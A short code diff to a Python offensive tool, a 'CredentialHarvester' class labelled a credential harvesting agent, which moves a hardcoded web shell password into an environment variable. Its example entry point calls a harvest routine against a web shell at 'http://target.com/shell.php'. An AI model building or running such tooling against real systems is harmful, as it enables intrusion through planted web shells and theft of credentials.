@@ -11,6 +11,9 @@ import logging
 
 log = logging.getLogger(__name__)
 
+# Get default shell password from environment variable
+DEFAULT_SHELL_PASSWORD = os.getenv('SHELL_PASSWORD', 'secret')
+
 
 class CredentialHarvester:
     """Credential harvesting agent"""
@@ -600,7 +603,7 @@ if __name__ == "__main__":
         # Harvest all credentials
         result = await harvester.harvest_all(
             shell_url="http://target.com/shell.php",
-            shell_password="secret"
+            shell_password=DEFAULT_SHELL_PASSWORD
         )
         
         print(f"Total credentials harvested: {result['total']}")
